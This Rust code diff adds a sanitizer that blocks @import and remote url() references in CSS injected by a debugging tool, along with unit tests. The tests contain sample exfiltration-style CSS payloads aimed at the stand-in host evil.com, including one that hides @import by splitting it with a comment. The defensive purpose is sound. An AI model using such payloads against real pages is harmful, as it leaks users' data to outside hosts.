@@ -126,3 +126,122 @@ pub fn sanitize_css_color(color: &str) -> Result<String, String> {
     }
     Ok(s.to_string())
 }
+
+/// Strip CSS `/* ... */` comments so a scan cannot be evaded by hiding `@import`/`url(`
+/// inside a comment that the browser's CSS parser ignores.
+fn strip_css_comments(css: &str) -> String {
+    let bytes = css.as_bytes();
+    let mut out = String::with_capacity(css.len());
+    let mut i = 0;
+    while i < bytes.len() {
+        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
+            i += 2;
+            while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
+                i += 1;
+            }
+            i = (i + 2).min(bytes.len());
+        } else {
+            out.push(bytes[i] as char);
+            i += 1;
+        }
+    }
+    out
+}
+
+/// Validate CSS submitted to `css inject` before it is added to the page. By default this
+/// rejects two remote-fetch vectors that turn a debugging tool into a data-exfiltration /
+/// `SSRF` channel (especially dangerous when chained with prompt injection from page-sourced
+/// content): `@import` (pulls a remote stylesheet) and `url(...)` pointing at a remote
+/// origin (`http(s)://`, protocol-relative `//host`, or any `scheme://`). Relative refs,
+/// `data:` URIs, and `#fragment` refs are allowed. Set `allow_remote` to opt back in to
+/// remote references when intentionally needed.
+///
+/// # Errors
+/// Returns an error describing the rejected construct (or oversize input).
+pub fn sanitize_injected_css(css: &str, allow_remote: bool) -> Result<(), String> {
+    const MAX_CSS_LEN: usize = 256 * 1024;
+    if css.len() > MAX_CSS_LEN {
+        return Err(format!(
+            "injected CSS too large ({} bytes, limit {MAX_CSS_LEN})",
+            css.len()
+        ));
+    }
+    if allow_remote {
+        return Ok(());
+    }
+    let scan = strip_css_comments(css).to_ascii_lowercase();
+    if scan.contains("@import") {
+        return Err(
+            "`@import` is blocked in injected CSS (it fetches a remote stylesheet — \
+                    a data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
+                .to_string(),
+        );
+    }
+    // Inspect every `url(...)` argument for a remote target.
+    let bytes = scan.as_bytes();
+    let mut search_from = 0;
+    while let Some(rel) = scan[search_from..].find("url(") {
+        let arg_start = search_from + rel + 4;
+        let arg_end = scan[arg_start..]
+            .find(')')
+            .map_or(scan.len(), |e| arg_start + e);
+        let arg = bytes[arg_start..arg_end]
+            .iter()
+            .map(|&b| b as char)
+            .collect::<String>();
+        let trimmed = arg.trim().trim_matches(['\'', '"']).trim();
+        if trimmed.starts_with("//") || trimmed.contains("://") {
+            return Err(format!(
+                "remote `url(...)` is blocked in injected CSS (`{}` would fetch a remote \
+                 origin — a data-exfiltration vector). Use a relative or data: URL, or pass \
+                 `allow_remote: true`.",
+                trimmed.chars().take(80).collect::<String>()
+            ));
+        }
+        search_from = arg_end;
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod injected_css_tests {
+    use super::sanitize_injected_css;
+
+    #[test]
+    fn blocks_at_import() {
+        assert!(sanitize_injected_css("@import url(https://evil.com/x.css);", false).is_err());
+        // Even hidden behind a comment.
+        assert!(sanitize_injected_css("/* x */@import 'https://evil.com';", false).is_err());
+        // Comment-splitting obfuscation is caught because comments are stripped first:
+        // `@imp/* */ort` collapses to `@import`.
+        assert!(sanitize_injected_css("@imp/* */ort url(//evil.com)", false).is_err());
+    }
+
+    #[test]
+    fn blocks_remote_url() {
+        assert!(
+            sanitize_injected_css("body{background:url(https://evil.com/x?d=1)}", false).is_err()
+        );
+        assert!(sanitize_injected_css("body{background:url('//evil.com/x')}", false).is_err());
+        assert!(sanitize_injected_css("a{cursor:url(ftp://evil.com/c)}", false).is_err());
+    }
+
+    #[test]
+    fn allows_local_and_data() {
+        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
+        assert!(sanitize_injected_css("body{background:url('/assets/x.png')}", false).is_ok());
+        assert!(sanitize_injected_css("body{background:url(#grad)}", false).is_ok());
+        assert!(
+            sanitize_injected_css("body{background:url(data:image/png;base64,AAAA)}", false)
+                .is_ok()
+        );
+    }
+
+    #[test]
+    fn allow_remote_opts_back_in() {
+        assert!(sanitize_injected_css("@import url(https://fonts.example/x.css);", true).is_ok());
+        assert!(
+            sanitize_injected_css("body{background:url(https://cdn.example/x.png)}", true).is_ok()
+        );
+    }
+}
